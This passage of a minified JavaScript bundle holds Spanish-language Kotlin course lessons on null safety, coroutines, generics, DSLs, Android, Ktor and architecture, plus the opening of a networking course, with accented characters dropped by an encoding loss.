`,completed:!1},{id:"kotlin-03-null-safety",title:"Null Safety - El fin de los NullPointerException",level:"junior",content:'# Leccin 03: Null Safety - El fin de los NullPointerException\n\nLa caracterstica estrella de Kotlin.\n\n## 1. Tipos Nulables (?) vs No-Nulables\n*   `String`: **Nunca** puede ser null.\n*   `String?`: **Puede** ser un String o null.\n\n```kotlin\nvar a: String = "abc"\n// a = null // ERROR de compilacin\n\nvar b: String? = "abc"\nb = null // OK (Pero ahora b es peligroso)\n```\n\n## 2. Acceso Seguro (Safe Call `?.`)\nSi `b` puede ser null, no puedes llamar a `b.length` directamente.\n```kotlin\nprintln(b?.length) // Imprime la longitud si b existe, o "null" si b es null\n```\n\n## 3. Elvis Operator (`?:`)\nDa un valor por defecto si la variable es null.\n```kotlin\nval l = b?.length ?: -1 \n// Si b es null, l ser -1\n```\n\n## 4. Not-null Assertion (`!!`) - Peligro!\nLe dices al compilador "Confa en m, s que esto no es null".\n```kotlin\nval l = b!!.length \n// Si b es null, lanza NullPointerException aqu mismo.\n```\n\n---\n\n### Misin Junior:\nNunca uses `!!` a menos que sea ABSOLUTAMENTE necesario (casi nunca). Usa `?.` y `?:` para escribir cdigo robusto.\n',completed:!1},{id:"kotlin-04-data-classes",title:"Clases y Objetos Modernos",level:"junior",content:'# Leccin 04: Clases y Objetos Modernos\n\nAs son las clases concisas. Menos ruido, ms seal.\n\n## 1. La Clase de una lnea\n```kotlin\nclass Persona(val nombre: String, var edad: Int)\n```\nEsto crea una clase llamada `Persona` con dos propiedades:\n*   `nombre`: `val` (Inmutable, solo getter).\n*   `edad`: `var` (Mutable, getter y setter).\n*   El constructor por defecto.\n\n## 2. Instanciacin (Sin `new`)\n```kotlin\nval p = Persona("Octavio", 30)\nprintln(p.nombre) // Getter automtico\np.edad = 31 // Setter automtico\n```\n\n## 3. Data Classes (Increble para DTOs!)\nTienen `equals()`, `hashCode()`, `toString()` y `copy()` gratis.\n```kotlin\ndata class Usuario(val id: Int, val email: String)\n\nval u1 = Usuario(1, "octavio@example.com")\nval u2 = u1.copy(id = 2) // Crea una copia idntica pero con id = 2\n\nprintln(u1) // Imprime: Usuario(id=1, email=octavio@example.com)\n```\n\n## 4. Herencia\nTodas las clases son `final` por defecto (no se pueden heredar). Si quieres heredar, debes usar `open`.\n```kotlin\nopen class Animal\nclass Perro : Animal()\n```\n\n---\n\n### Misin Junior:\nSi tienes una clase que solo guarda datos, SIEMPRE usa `data class`. Es ms legible y seguro.\n',completed:!1},{id:"kotlin-05-practica-junior",title:"Prctica Kotlin Junior: El Sistema de Anlisis de Texto",level:"junior",content:`# Prctica Kotlin Junior: El Sistema de Anlisis de Texto

Demuestra que entiendes la simplicidad de Kotlin.

---

## 1. El Analizador (Extension Functions)
Crea una clase \`Analizador\`.
*   Crea una funcin de extensin para \`String\` llamada \`contarPalabras()\`:
    *   Divide el string por espacios (\`split(" ")\`).
    *   Cuenta las palabras resultantes.

## 2. El Reportero (Listas y Filtrado)
En el mtodo \`main\`:
1.  Crea una lista de Strings inmutable (\`val frases = listOf("Hola mundo", "Esto es Kotlin")\`).
2.  Itera sobre la lista con un bucle \`for\`.
3.  Imprime solo las frases que tengan ms de 1 palabra.
4.  Usa tu funcin \`contarPalabras()\`.

## 3. Reto de Null Safety
Recibe un string nullable (\`String?\`), si es null, imprime "Texto Vaco" (usando el operador Elvis \`?:\`).

---

### Misin:
Un desarrollador Junior de Kotlin no escribe cdigo Java en Kotlin (\`if (s != null)\`). Escribe cdigo idiomtico (\`s?.let\`).
`,completed:!1,isProject:!0},{id:"kotlin-06-objetos-interfaces",title:"Objetos y Singleton (El adis a `static`)",level:"junior",content:`# Leccin 06: Objetos y Singleton (El adis a \`static\`)

Kotlin no tiene la palabra clave \`static\`. Qu horror! Cmo hacemos constantes? Con \`Object\`.

## 1. Object Declaration (Singleton)
Define una clase y crea una instancia NICA al mismo tiempo.
\`\`\`kotlin
object DatabaseConfig {
    const val URL = "jdbc:mysql://localhost:3306"
    fun connect() { println("Conectando a $URL") }
}

// Uso directo
DatabaseConfig.connect()
\`\`\`

## 2. Companion Object
Si quieres algo "esttico" dentro de una clase normal.
\`\`\`kotlin
class Usuario {
    companion object {
        fun crearAnonimo(): Usuario = Usuario()
    }
}
val u = Usuario.crearAnonimo()
\`\`\`

## 3. Interfaces
Igual que en Java, pero pueden tener implementacin por defecto.
\`\`\`kotlin
interface Volador {
    fun volar() { print("Volando...") } // Default
}

class Pajaro : Volador // No necesita implementar volar()
\`\`\`

---

### Misin Junior:
Si tienes una clase \`Util\` con puros mtodos estticos (como en Java), en Kotlin mejor usa "Top Level Functions" (funciones fuera de cualquier clase, directamente en el archivo). Es ms limpio.
`,completed:!1},{id:"kotlin-07-practica-nullsafety",title:"Prctica Kotlin Junior: Rescatando Nulos",level:"junior",content:'# Prctica Kotlin Junior: Rescatando Nulos\n\nEspera! No tan rpido. Antes de avanzar, demuestra que sabes sobrevivir en el mundo nullable.\n\n## 1. El Formulario de Registro (Data Classes)\nCrea una `data class` llamada `Usuario` con:\n*   `nombre`: String (Obligatorio)\n*   `edad`: Int? (Opcional, puede ser null)\n*   `telefono`: String? (Opcional)\n\n## 2. El Validador (Null Safety)\nEscribe una funcin `validarUsuario(u: Usuario)`:\n1.  Si `edad` es null, imprime "Edad desconocida".\n2.  Si `edad` es menor de 18, imprime "Menor de edad".\n3.  Si `telefono` existe, imprime "Llamando a $telefono". Si no, imprime "Sin telfono". (Usa `let` o `if`).\n\n## 3. Reto: Filtrado Seguro\n*   Crea `val lista: List<Usuario?> = listOf(u1, null, u2, null)`.\n*   Itera e imprime solo los nombres de los usuarios que NO son null. (Tips: `lista.filterNotNull()`).\n\n---\n\n### Misin:\nUn desarrollador Kotlin escribe cdigo que casi nunca lanza `NullPointerException`. Si tu cdigo falla por un null, fallaste como desarrollador Kotlin.\n',completed:!1,isProject:!0},{id:"kotlin-08-colecciones-lambdas",title:"Colecciones y Programacin Funcional",level:"semi-senior",content:`# Leccin 08: Colecciones y Programacin Funcional

Kotlin tiene una API de colecciones envidiable.

## 1. Listas Inmutables vs Mutables
Por defecto, \`listOf\` crea una lista de solo lectura.
\`\`\`kotlin
val numeros = listOf(1, 2, 3)
// numeros.add(4) // ERROR de compilacin

val mutables = mutableListOf(1, 2, 3)
mutables.add(4) // OK
\`\`\`

## 2. Lambdas y Higher-Order Functions
Una funcin puede recibir otra funcin como parmetro.
\`\`\`kotlin
val doble = { x: Int -> x * 2 }
println(doble(5)) // 10

// Pasar lambda como ltimo parmetro (Trailing Lambda)
numeros.filter { it > 2 } // "it" es el nombre por defecto del parmetro nico
\`\`\`

## 3. Operaciones Funcionales
*   \`map\`: Transforma cada elemento.
*   \`filter\`: Selecciona elementos.
*   \`forEach\`: Ejecuta una accin.
*   \`reduce / fold\`: Acumula un resultado.

\`\`\`kotlin
val pares = numeros
    .filter { it % 2 == 0 }
    .map { it * 10 }
// Resultado: [20]
\`\`\`

---

### Misin Semi-Senior:
Aprende a usar \`.asSequence()\` si tienes una lista gigante y vas a encadenar muchos \`map\` y \`filter\`. Evita crear listas intermedias innecesarias.
`,completed:!1},{id:"kotlin-09-extensiones-sealed",title:"Extension Functions y Sealed Classes",level:"semi-senior",content:`# Leccin 09: Extension Functions y Sealed Classes

Dos sper poderes que Java no tiene (o no tena).

## 1. Extension Functions (Magia)
Puedes agregar mtodos a clases que no te pertenecen (ej: \`String\`, \`List\`, incluso \`Activity\` en Android).
\`\`\`kotlin
// Agregamos un mtodo .esEmail() a la clase String
fun String.esEmail(): Boolean {
    return this.contains("@") && this.contains(".")
}

val correo = "test@test.com"
println(correo.esEmail()) // True
\`\`\`
**Nota:** Esto en realidad es un mtodo esttico que recibe el String como primer argumento. Puro azcar sintctico.

## 2. Sealed Classes (Enum con Esteroides)
Una clase sellada restringe la jerarqua de herencia. Todas las subclases deben estar conocidas en tiempo de compilacin (normalmente en el mismo archivo).
\`\`\`kotlin
sealed class EstadoUI {
    object Cargando : EstadoUI()
    data class Exito(val datos: String) : EstadoUI()
    data class Error(val mensaje: String) : EstadoUI()
}

// El compilador te obliga a cubrir TODOS los casos en un 'when'
fun manejarEstado(e: EstadoUI) {
    when (e) {
        is EstadoUI.Cargando -> mostrarSpinner()
        is EstadoUI.Exito -> mostrarDatos(e.datos)
        is EstadoUI.Error -> mostrarError(e.mensaje)
        // No hace falta 'else', los casos son exhaustivos
    }
}
\`\`\`

---

### Misin Semi-Senior:
Las \`Sealed Classes\` son el estndar para manejar estados en UI moderna (MVI/MVVM) en Android.
`,completed:!1},{id:"kotlin-10-concurrencia-corutinas",title:"Excepciones y Concurrencia (Corutinas)",level:"semi-senior",content:`# Leccin 10: Excepciones y Concurrencia (Corutinas)

El manejo de hilos en Java es un dolor de cabeza. Kotlin lo soluciona con **Corrutinas**.

## 1. Excepciones (\`checked\` vs \`unchecked\`)
En Kotlin, **TODAS las excepciones son Unchecked**.
No ests obligado a atraparlas (\`try-catch\`).
\`\`\`kotlin
// Java
// public void f() throws IOException

// Kotlin
// fun f() -> Simplemente corre. Si quieres, la atrapas.
\`\`\`

## 2. Corrutinas (Introduccin)
Son "light-weight threads". Puedes tener 1 milln de Corrutinas en un solo hilo del sistema operativo.
\`\`\`kotlin
import kotlinx.coroutines.*

fun main() {
    GlobalScope.launch { // Crea una corrutina
        delay(1000L) // Pausa de 1 segundo (no bloquea el hilo)
        println("Mundo!")
    }
    println("Hola,")
    Thread.sleep(2000L) // Espera a que termine la corrutina
}
\`\`\`

## 3. Suspend Functions
Una funcin con la palabra clave \`suspend\` solo puede ser llamada desde otra \`suspend\` o dentro de una corrutina.
\`\`\`kotlin
suspend fun tareaPesada(): Int {
    delay(1000L)
    return 42
}
\`\`\`

## 4. Async / Await
Para operaciones paralelas que devuelven un resultado.
\`\`\`kotlin
val resultado1 = async { tareaPesada() }
val resultado2 = async { tareaPesada() }

// Espera a que ambas terminen (Corre en paralelo)
println(resultado1.await() + resultado2.await())
\`\`\`

---

### Misin Concurrente:
Nunca uses \`GlobalScope\` en produccin. Usa un \`CoroutineScope\` atado al ciclo de vida de tu componente (ej: \`viewModelScope\` en Android) para evitar Fugas de Memoria.
`,completed:!1},{id:"kotlin-11-practica-semi-senior",title:"Prctica Kotlin Semi-Senior: El Gestor de Estados Asncronos",level:"semi-senior",content:'# Prctica Kotlin Semi-Senior: El Gestor de Estados Asncronos\n\nEs hora de usar Corrutinas y Clases Selladas para modelar un sistema moderno.\n\n---\n\n## 1. El Estado (Sealed Class)\nModela un proceso de login:\n*   `sealed class LoginState`\n*   `object Loading : LoginState()`\n*   `data class Success(val token: String) : LoginState()`\n*   `data class Error(val msg: String) : LoginState()`\n\n## 2. La API Asncrona (Coroutines)\nCrea una clase `AuthRepo`:\n*   Mtodo `suspend fun login(user: String): LoginState`\n*   Simula una espera de 2 segundos (`delay(2000)`).\n*   Si el usuario es "admin", retorna `Success("abc-123")`.\n*   Si no, retorna `Error("Credenciales invlidas")`.\n\n## 3. El Consumidor (Main)\nEn el mtodo `main` (usando `runBlocking` para simplicidad):\n1.  Inicia el estado en `Loading`. Imprime "Cargando...".\n2.  Llama a `login("admin")` dentro de una corrutina (`launch`).\n3.  Usa un `when` exhaustivo para imprimir el resultado final ("Bienvenido token..." o "Error...").\n\n---\n\n### Misin:\nUn desarrollador Semi-Senior maneja el estado de su aplicacin de forma predecible y segura, evitando sorpresas nulas y condiciones de carrera.\n',completed:!1,isProject:!0},{id:"kotlin-12-generics-reified",title:"Generics Avanzados (Reified, In, Out)",level:"senior",content:'# Leccin 12: Generics Avanzados (Reified, In, Out)\n\nLos genricos en Java tienen "Type Erasure". En Kotlin, con `inline` y `reified`, podemos recuperar los tipos en tiempo de ejecucin.\n\n## 1. Reified Type Parameters\nNormalmente no puedes hacer `if (obj is T)`. T no existe en runtime.\nPero si usas `inline`, el compilador "copia y pega" el cdigo, incluyendo el tipo real.\n```kotlin\ninline fun <reified T> filtrarPorTipo(lista: List<Any>): List<T> {\n    return lista.filterIsInstance<T>()\n}\n\nval lista = listOf(1, "Hola", 2, "Mundo")\nval strings = filtrarPorTipo<String>(lista) // ["Hola", "Mundo"]\n```\n\n## 2. Varianza (`in` y `out`)\n*   **Productor (`out`):** Solo lees datos (Covarianza). `List<out T>`.\n    *   `List<String>` es subtipo de `List<Any>`.\n*   **Consumidor (`in`):** Solo escribes datos (Contravarianza). `Comparable<in T>`.\n    *   `Comparable<Any>` puede comparar Strings.\n\n---\n\n### Misin Senior:\n`reified` es muy poderoso para parsear JSON con libreras como Gson o Jackson sin pasar `Class<T>` como argumento. `parseJson<Usuario>(json)`.\n',completed:!1},{id:"kotlin-13-delegacion-dsls",title:"Delegacin (Delegated Properties) y DSLs",level:"senior",content:`# Leccin 13: Delegacin (Delegated Properties) y DSLs

Escribir cdigo que parece prosa. El sueo de Kotlin.

## 1. Delegacin de Propiedades (\`by\`)
No implementes getters/setters repetitivos. Deja que otro objeto lo haga.
*   **by lazy:** Inicializacin perezosa (solo se crea la primera vez que se accede).
*   **by observable:** Ejecuta cdigo cuando el valor cambia.

\`\`\`kotlin
val pesado: String by lazy {
    println("Calculando...")
    "Resultado costoso"
}

var nombre: String by Delegates.observable("Nadie") { _, viejo, nuevo ->
    println("Cambi de $viejo a $nuevo")
}
\`\`\`

## 2. Creacin de DSLs (Domain Specific Languages)
Usando Lambdas con Receiver (\`String.() -> Unit\`).
Esto permite crear estructuras anidadas como HTML.
\`\`\`kotlin
fun html(bloque: HTML.() -> Unit): HTML {
    val h = HTML()
    h.bloque()
    return h
}

// Uso del DSL
val pagina = html {
    head { title = "Mi Pgina" }
    body {
        h1("Bienvenido")
        p("Esto es un DSL en Kotlin")
    }
}
\`\`\`
Librerias como **Ktor** (Backend/Cliente) y **Jetpack Compose** (UI) se basan enteramente en esto.

---

### Misin Senior:
Los DSLs son poderosos pero difciles de depurar. salos para configurar sistemas complejos (como validacin o routing), no para lgica de negocio trivial.
`,completed:!1},{id:"kotlin-14-kmp-flow",title:"Kotlin Multiplatform (KMP) y Corrutinas Avanzadas (Flow)",level:"senior",content:`# Leccin 14: Kotlin Multiplatform (KMP) y Corrutinas Avanzadas (Flow)

El futuro es compartir cdigo entre Android, iOS y Backend.

## 1. Kotlin Multiplatform (Common Code)
Escribes la lgica una vez (\`commonMain\`).
*   **Expect:** Defines una interfaz en el mdulo comn (ej: \`expect fun randomUUID(): String\`).
*   **Actual:** Implementas la funcin en cada plataforma (Android usa \`java.util.UUID\`, iOS usa \`NSUUID\`).
*   Compartes: Modelos de datos, Validaciones, Redes (Ktor client), Base de datos (SQLDelight).

## 2. Shared Flows y State Flows (Reactive)
**Flow** es la versin Kotlin de RxJava (Streams reactivos y fros).
*   **Cold Flow:** Solo empieza cuando alguien suscribe (\`collect\`).
*   **StateFlow (Hot):** Mantiene el ltimo valor (ideal para UI State).
*   **SharedFlow (Hot):** Emite eventos puntuales (ej: "Error de red", "Login exitoso").

\`\`\`kotlin
class MyViewModel : ViewModel() {
    private val _state = MutableStateFlow("Cargando...")
    val state = _state.asStateFlow() // Exponer solo lectura

    fun cargarDatos() {
        viewModelScope.launch {
            _state.value = "Datos listos" // Actualiza la UI reactivamente
        }
    }
}
\`\`\`

---

### Misin Senior:
El patrn MVVM en Android se basa en exponer **Estados** (\`StateFlow\`) inmutables desde el ViewModel y consumirlos en la UI (Activity/Fragment/Compose).
`,completed:!1},{id:"kotlin-15-practica-senior",title:"Prctica y Evaluacin: Arquitecto Kotlin Senior",level:"senior",content:`# Prctica y Evaluacin: Arquitecto Kotlin Senior

Ya no eres un usuario de Kotlin, eres un **creador** de herramientas.

---

## 1. El Constructor de JSON (DSL y Reified)
**Consigna:** Crea un Mini-DSL para construir JSON de forma typesafe.
*   Debe permitir anidar objetos y arrays.
\`\`\`kotlin
val json = json {
    prop("nombre", "Octavio")
    obj("direccion") {
        prop("calle", "Falsa 123")
    }
    arr("hobbies") {
        add("Leer")
        add("Programar")
    }
}
// Resultado: {"nombre": "Octavio", "direccion": {"calle": "Falsa 123"}, "hobbies": ["Leer", "Programar"]}
\`\`\`

## 2. El Observador Reactivo (Flow / StateFlow)
**Escenario:**
*   Crea un \`class SensorTemperatura\` que emita valores aleatorios cada 500ms usando un \`Flow\`.
*   Crea un \`class Monitor\` que se suscriba (\`collect\`) a este flujo.
*   El monitor debe filtrar temperaturas menores a 20C y transformar las dems a Fahrenheit (\`map\`).
*   Imprime solo si la temperatura cambia respecto a la anterior (\`distinctUntilChanged\`).

## 3. Delegacin Personalizada
**Consigna:**
*   Crea un delegado \`var stringSinEspacios: String by TrimDelegate()\`.
*   Si asignas \`"  Hola   "\`, al leerlo debe devolver \`"Hola"\`.
*   Implementa la interfaz \`ReadWriteProperty\`.

---

### Resultado esperado:
Cdigo limpio, expresivo y con un diseo que aproveche las caractersticas avanzadas del lenguaje para simplificar la vida del desarrollador que lo use.
`,completed:!1,isProject:!0},{id:"kotlin-16-backend-ktor-spring",title:"Kotlin en Backend (Ktor y Spring Boot)",level:"senior",content:`# Leccin 16: Kotlin en Backend (Ktor y Spring Boot)

Kotlin no es solo para mviles. En el servidor, brilla con corrutinas y DSLs.

## 1. Spring Boot con Kotlin
Es igual que Java, pero ms corto.
\`\`\`kotlin
@RestController
@RequestMapping("/api/users")
class UserController(val service: UserService) { // Inyeccin por constructor automtica

    @GetMapping
    fun getAll() = service.findAll() // Single-expression
}
\`\`\`
**Hibernate y Kotlin:**
Debes usar el plugin \`all-open\` en Gradle, porque las clases en Kotlin son \`final\` por defecto y Hibernate necesita heredar de ellas (proxies).

## 2. Ktor (El Framework Nativo)
Creado por JetBrains. 100% Kotlin, asncrono y ligero. Usa DSLs para todo.
\`\`\`kotlin
fun main() {
    embeddedServer(Netty, port = 8080) {
        routing {
            get("/") {
                call.respondText("Hola Mundo desde Ktor!")
            }
            get("/json") {
                call.respond(mapOf("mensaje" to "Soy un JSON"))
            }
        }
    }.start(wait = true)
}
\`\`\`
No hay anotaciones mgicas, todo es cdigo explcito.

---

### Misin Backend:
Si vienes de Java Enterprise, Spring Boot te har sentir en casa. Si vienes de Node.js o Go, amars **Ktor** por su ligereza y control.
`,completed:!1},{id:"kotlin-17-android-jetpack",title:"Kotlin en Android (Jetpack y MVVM)",level:"senior",content:`# Leccin 17: Kotlin en Android (Jetpack y MVVM)

El 98% de las apps modernas de Android usan Kotlin. Por qu? Porque **Jetpack Compose** (la UI declarativa) solo existe en Kotlin.

## 1. La Arquitectura Moderna
*   **Activity/Fragment:** La "vista" tradicional. Se encarga del ciclo de vida (Android es complicado con esto).
*   **Jetpack Compose:** La nueva forma de construir UI con funciones \`@Composable\`. Adis XML.

\`\`\`kotlin
@Composable
fun Saludo(nombre: String) {
    Text(text = "Hola $nombre!")
}
\`\`\`

## 2. ViewModel y StateFlow
El **ViewModel** sobrevive si rotas la pantalla (destruccin y recreacin de Activity).
El estado viaja desde el ViewModel hacia la UI.
\`\`\`kotlin
class MainViewModel : ViewModel() {
    private val _uiState = MutableStateFlow("Cargando...")
    val uiState: StateFlow<String> = _uiState

    fun onEvent() { _uiState.value = "Datos Listos" }
}
\`\`\`

## 3. Integracin con Bases de Datos (Room)
Room es la librera oficial de SQLite. Usa anotaciones y corrutinas.
\`\`\`kotlin
@Dao
interface UserDao {
    @Query("SELECT * FROM users")
    fun getAll(): Flow<List<User>> // Reactivo! Si la DB cambia, la UI se actualiza sola.

    @Insert
    suspend fun insert(user: User) // Suspendible para no bloquear la UI.
}
\`\`\`

---

### Misin Android:
Nunca bloquees el **Main Thread** en Android. Si haces una operacin de red o DB en el hilo principal, la app se congela y sale el temido dilogo "Application Not Responding (ANR)". Usa \`viewModelScope.launch { ... }\`.
`,completed:!1},{id:"kotlin-18-testing-mockk",title:"Testing en Kotlin (Mockk y Kotest)",level:"senior",content:`# Leccin 18: Testing en Kotlin (Mockk y Kotest)

Kotlin tiene frameworks de testing diseados especficamente para el lenguaje, aprovechando su sintaxis expresiva.

## 1. Mockk (El Mockito de Kotlin)
Mockito funciona en Kotlin, pero "Mockk" es mejor. Soporta mtodos finales, objetos estticos y corrutinas de forma nativa.
\`\`\`kotlin
val service = mockk<UserService>()
every { service.getUser(1) } returns User("Octavio")

// Verificacin
verify { service.getUser(1) }
\`\`\`

## 2. JUnit 5 con Kotlin
\`\`\`kotlin
class CalculadoraTest {
    @Test
    fun \`sumar dos numeros deberia dar correcto\`() { // Nombres con espacios!
        val resultado = sumar(2, 2)
        assertEquals(4, resultado)
    }
}
\`\`\`

## 3. Testing de Corrutinas
Para testear una \`suspend fun\`, necesitas \`runTest\` (de la librera \`kotlinx-coroutines-test\`).
Esto salta los \`delay()\` reales para que el test sea instantneo.
\`\`\`kotlin
@Test
fun \`test asincrono\`() = runTest {
    val dato = repo.getData() // Funcin suspendida
    assertEquals("Info", dato)
}
\`\`\`

---

### Misin Testing:
Usa nombres de tests descriptivos con "backticks" (\\\`). Es una feature nica de Kotlin que hace los reportes mucho ms legibles. \`fun \\\`el usuario no deberia poder loguearse con password vacio\\\`()\`.
`,completed:!1},{id:"kotlin-19-arquitectura-modular",title:"Arquitectura Limpia y Modularizacin en Kotlin",level:"senior",content:`# Leccin 19: Arquitectura Limpia y Modularizacin en Kotlin

En proyectos grandes, el mayor enemigo es el acoplamiento.

## 1. Modularizacin Vertical ("Por Feature")
En lugar de tener carpetas \`ui\`, \`data\`, \`domain\`, dividimos por funcionalidad:
*   \`:features:login\`
*   \`:features:profile\`
*   \`:features:checkout\`
*   \`:core:network\`
*   \`:core:database\`

**Ventaja:** Compilacin ms rpida (Gradle solo recompila el mdulo que tocaste) y posibilidad de reutilizar features en otras apps.

## 2. Inyeccin de Dependencias (Koin vs Hilt)
*   **Hilt (Dagger):** Generacin de cdigo en tiempo de compilacin. Estndar en Android.
*   **Koin:** Service Locator en tiempo de ejecucin. 100% Kotlin DSL. Ms fcil de aprender, pero un poco menos performante en startup.
\`\`\`kotlin
// Mdulo Koin
val appModule = module {
    single<UserRepository> { UserRepositoryImpl(get()) }
    viewModel { UserViewModel(get()) }
}
\`\`\`

## 3. Clean Architecture (Domain Driven)
1.  **Domain:** Entidades puras y UseCases. (Sin Android, sin Retrofit, sin Room).
2.  **Data:** Implementacin de repositorios. Mapper de DTO a Dominio.
3.  **Presentation:** ViewModel y UI (Compose/XML).

---

### Misin Senior:
Usa el modificador \`internal\` en Kotlin. Hace que una clase sea visible SOLO dentro del mismo mdulo Gradle. Esto fuerza a que nadie "desde fuera" toque tus partes internas. Es la clave del encapsulamiento modular.
`,completed:!1},{id:"kotlin-20-performance-inline",title:"Performance y Escalabilidad (Inline y Corrutinas)",level:"senior",content:'# Leccin 20: Performance y Escalabilidad (Inline y Corrutinas)\n\nEscribir cdigo en Kotlin es un placer, pero tiene sus trampas de rendimiento si no sabes cmo compila.\n\n## 1. Inline Classes (`value class`)\nSi tienes un ID que es un String, podras confundir `userId` con `productId`.\n```kotlin\n@JvmInline\nvalue class UserId(val id: String)\n\nfun login(id: UserId) { ... }\n// Esto compila como un String puro en bytecode, sin el "Overhead" de un Objeto.\n```\n\n## 2. Inlined Lambdas (`noinline` / `crossinline`)\nLas funciones de orden superior (`list.map`) crean objetos Lambda en memoria.\n*   Si usas `inline` en tu funcin: El compilador copia el cdigo de la lambda DENTRO de la funcin. **Cero overhead.**\n\n## 3. Dispatchers y Concurrencia Masiva\n*   `Dispatchers.Main`: UI (Android).\n*   `Dispatchers.IO`: Red/Disco. Tiene un pool gigante (64+ hilos) porque los hilos se bloquean esperando I/O.\n*   `Dispatchers.Default`: CPU (JSON parsing, clculos). Tiene tantos hilos como Cores tenga tu CPU.\n\n**Cuello de botella:** Si haces JSON parsing en `Dispatchers.IO`, saturas los hilos y bloqueas la red. Si haces Red en `Dispatchers.Default`, bloqueas el CPU esperando respuestas. Usa el Dispatcher correcto!\n\n---\n\n### Misin Senior:\nUsa `Sequence` en lugar de `Iterable` para operaciones encadenadas largas (`list.map.filter.groupBy`). Evita crear colecciones intermedias y procesa elemento por elemento (Lazy Evaluation).\n',completed:!1},{id:"kotlin-21-seguridad-contracts",title:"La Seguridad en Kotlin (Null Safety y Contracts)",level:"senior",content:'# Leccin 21: La Seguridad en Kotlin (Null Safety y Contracts)\n\nEl sistema de tipos de Kotlin es tu amigo, pero puedes abusar de l.\n\n## 1. El Peligro del `!!` (Not-null Assertion)\n*   **Problema:** `val len = data!!.length`. Lanza `NPE` si `data` es `null`.\n*   **Diagnstico:** Por qu lo usaste? Porque "estabas seguro"? Y si el backend cambia y enva null?\n*   **Solucin:** `checkNotNull(data) { "Data no puede ser null en esta parte del flujo" }`.\n    *   Lanza una `IllegalStateException` con mensaje claro. Mucho mejor que un NPE genrico.\n\n## 2. Smart Casts y Contracts\nSi verificas que `obj is String`, el compilador sabe que dentro del `if` es un String.\n```kotlin\nfun procesar(obj: Any) {\n    if (obj !is String) return\n    println(obj.length) // Compila!\n}\n```\n**Contracts:** Puedes ensear al compilador tus propias reglas.\n```kotlin\n@OptIn(ExperimentalContracts::class)\nfun requireString(x: Any?) {\n    contract { returns() implies (x is String) }\n    if (x !is String) throw IllegalArgumentException()\n}\n```\n\n## 3. Inmutabilidad por Defecto\nEn seguridad, el estado mutable compartido es el ENEMIGO.\n*   Kotlin fuerza `val` (lectura) sobre `var` (escritura).\n*   Las listas son `List` (lectura) por defecto, no `MutableList`.\n*   Esto previene condiciones de carrera y efectos colaterales.\n\n---\n\n### Misin de Seguridad:\nNunca expongas `MutableList` o `MutableStateFlow` fuera de tu clase. Expn siempre la versin inmutable (`List` o `StateFlow`). Encapsulamiento defensivo.\n',completed:!1},{id:"kotlin-22-errores-comunes",title:"Errores Comunes en Kotlin (Gotchas)",level:"senior",content:'# Leccin 22: Errores Comunes en Kotlin (Gotchas)\n\nKotlin es seguro, pero no es mgico. Aqu tienes las trampas donde caen todos al principio.\n\n## 1. Abuso de `!!` (Not-Null Assertion)\n*   **Error:** `usuario!!.nombre`.\n*   **Por qu:** Ests desactivando la seguridad del lenguaje. Si es null, explota.\n*   **Solucin:** Usa `?.` (Safe Call) o `?:` (Elvis Operator). O refactoriza para que la variable no sea nullable.\n\n## 2. No usar `data class` para DTOs\n*   **Error:** `class Usuario(val nombre: String)`.\n*   **Por qu:** `println(usuario)` imprimir `Usuario@5f184fc`. `usuario1 == usuario2` dar `false` aunque tengan el mismo nombre.\n*   **Solucin:** `data class Usuario(...)`. Te da `toString()`, `equals()` y `hashCode()` gratis.\n\n## 3. Confundir `List` (Lectura) con `MutableList`\n*   **Error:** Tratar de hacer `.add()` en una `List`.\n*   **Por qu:** `List` en Kotlin es inmutable por contrato (aunque por debajo sea un ArrayList de Java).\n*   **Solucin:** Usa `mutableListOf()` solo si realmente necesitas modificarla.\n\n## 4. Capturar estado mutable en Lambdas\n*   **Error:**\n    ```kotlin\n    var contador = 0\n    list.forEach {\n        contador++ // Peligro en paralelo!\n    }\n    ```\n*   **Por qu:** Las lambdas no son thread-safe por magia.\n*   **Solucin:** Usa `AtomicInteger` o, mejor an, operaciones funcionales como `fold` o `count`.\n\n## 5. Olvidar `open` en clases para herencia\n*   **Error:** `class Padre { ... } class Hijo : Padre()`.\n*   **Por qu:** Error de compilacin. Las clases son `final` por defecto.\n*   **Solucin:** `open class Padre`. (O mejor: prefiere composicin sobre herencia).\n\n---\n\n### Misin de Calidad:\nSi tu cdigo Kotlin parece Java traducido lnea por lnea, lo ests haciendo mal. Busca la forma "idiomtica" (Kotlin-way).\n',completed:!1},{id:"kotlin-23-roadmap-kotlin",title:"Roadmap Kotlin - Tu Carrera en la JVM",level:"senior",content:`# Leccin 23: Roadmap Kotlin - Tu Carrera en la JVM

Hacia dnde ir ahora? El ecosistema Kotlin es gigante.

## Camino 1: El Desarrollador Android Moderno
*   **Foco:** Aplicaciones mviles nativas.
*   **Aprender:**
    *   **Core:** Activity, Fragment, Ciclo de Vida.
    *   **UI Declarativa:** Jetpack Compose (Indispensable hoy).
    *   **Clean Arch:** ViewModel, StateFlow, Room DB.
    *   **Red:** Retrofit + Corrutinas.
    *   **Inyeccin:** Hilt / Koin.
    *   **CI/CD:** GitHub Actions para publicar en Play Store.

## Camino 2: El Desarrollador Backend (Ktor/Spring)
*   **Foco:** APIs robustas y Microservicios.
*   **Aprender:**
    *   **Ktor:** DSLs, Plugins, Autenticacin (JWT), Websockets.
    *   **Spring Boot:** JPA, Security, Cloud, pero con sintaxis Kotlin.
    *   **Bases de Datos:** **Exposed** (ORM de Kotlin) o SQLDelight.
    *   **Testing:** TestContainers, Mockk.

## Camino 3: El Multiplatform Ninja (KMP)
*   **Foco:** Escribir una vez, correr en todas partes.
*   **Aprender:**
    *   Configuracin de Gradle Multiplatform.
    *   Compartir Lgica (\`commonMain\`).
    *   **UI Compartida:** Compose Multiplatform (Android + iOS + Desktop).
    *   **Libreras KMP:** SQLDelight, Ktor Client, Koin.

---

### Misin Final:
Kotlin es un lenguaje pragmtico y expresivo. No busques la solucin ms "compleja", busca la ms "legible". Disfruta programando!
`,completed:!1}]},E1={id:"logic",title:"Logic (En recuperacin)",description:"Contenido educativo siendo restaurado.",completed:!1,lessons:[]},S1={id:"mathbasic",title:"Mathbasic (En recuperacin)",description:"Contenido educativo siendo restaurado.",completed:!1,lessons:[]},dD={id:"networking",title:"Redes para Desarrolladores",description:"Entiende cmo viajan los datos por el cable y el aire. Desde fundamentos de IP hasta arquitecturas de red complejas en la nube.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"net-01-fundamentos",title:"Fundamentos: IP, Puertos e Internet",level:"junior",content:`# Leccin 1: Qu es una Red y cmo funciona Internet?

